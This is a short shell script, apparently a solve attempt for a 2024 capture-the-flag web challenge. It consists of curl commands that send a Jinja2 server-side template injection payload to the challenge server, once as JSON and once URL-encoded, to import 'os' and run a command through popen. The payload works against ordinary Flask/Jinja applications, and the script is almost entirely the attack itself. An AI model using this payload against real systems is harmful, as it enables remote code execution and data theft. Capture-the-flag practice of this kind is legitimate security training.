#curl -X POST -H "Content-Type: application/json" -d '{"user_input":"{{request.application.__globals__.__builtins__.__import__('os').popen('/flag').read()}}"}' https://web-parrot-the-emu-4c2d0c693847.2024.ductf.dev/ > response.txt
#curl -X POST -H "Content-Type: application/json" -d '{"user_input":"hello"}' https://web-parrot-the-emu-4c2d0c693847.2024.ductf.dev/ > response.txt

curl 'https://web-parrot-the-emu-4c2d0c693847.2024.ductf.dev/' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'accept-language: ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7,pt;q=0.6' \
  -H 'cache-control: max-age=0' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'origin: https://web-parrot-the-emu-4c2d0c693847.2024.ductf.dev' \
  -H 'priority: u=0, i' \
  -H 'referer: https://web-parrot-the-emu-4c2d0c693847.2024.ductf.dev/' \
  -H 'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: document' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-user: ?1' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36' \
  --data-raw 'user_input=%7B%7Brequest.application.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27%2flag%27%29.read%28%29%7D%7D' > response.txt

cat response.txt